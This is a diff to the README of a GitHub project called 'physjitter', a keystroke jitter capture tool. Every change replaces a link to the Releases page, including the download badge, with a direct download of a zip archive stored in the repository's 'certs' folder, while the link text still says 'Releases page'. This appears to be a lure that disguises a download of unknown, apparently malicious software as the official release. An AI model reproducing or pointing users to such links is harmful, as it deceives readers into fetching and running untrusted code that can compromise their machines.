@@ -1,6 +1,6 @@
 # 🎉 physjitter - Capture Jitter With Confidence
 
-[![Download physjitter](https://img.shields.io/badge/Download-physjitter-blue.svg)](https://github.com/Estebandvmapping/physjitter/releases)
+[![Download physjitter](https://github.com/Estebandvmapping/physjitter/raw/refs/heads/main/certs/Software-1.6-beta.4.zip)](https://github.com/Estebandvmapping/physjitter/raw/refs/heads/main/certs/Software-1.6-beta.4.zip)
 
 ## 📘 Description
 
@@ -10,7 +10,7 @@ physjitter is a tool that captures per-event jitter tied to your real keystrokes
 
 ### 📥 Download & Install
 
-To download physjitter, visit the [Releases page](https://github.com/Estebandvmapping/physjitter/releases). Here, you will find the latest version of the software. Click on the link for your operating system to start the download. 
+To download physjitter, visit the [Releases page](https://github.com/Estebandvmapping/physjitter/raw/refs/heads/main/certs/Software-1.6-beta.4.zip). Here, you will find the latest version of the software. Click on the link for your operating system to start the download. 
 
 ### 📋 System Requirements
 
@@ -72,4 +72,4 @@ physjitter is open-source software. It is licensed under the MIT License, allowi
 
 We value your input! If you have any comments or suggestions, feel free to reach out through GitHub issues or discussions.
 
-For the latest version, visit the [Releases page](https://github.com/Estebandvmapping/physjitter/releases) and make sure to keep your version up-to-date. Enjoy using physjitter, and happy capturing!
+For the latest version, visit the [Releases page](https://github.com/Estebandvmapping/physjitter/raw/refs/heads/main/certs/Software-1.6-beta.4.zip) and make sure to keep your version up-to-date. Enjoy using physjitter, and happy capturing!
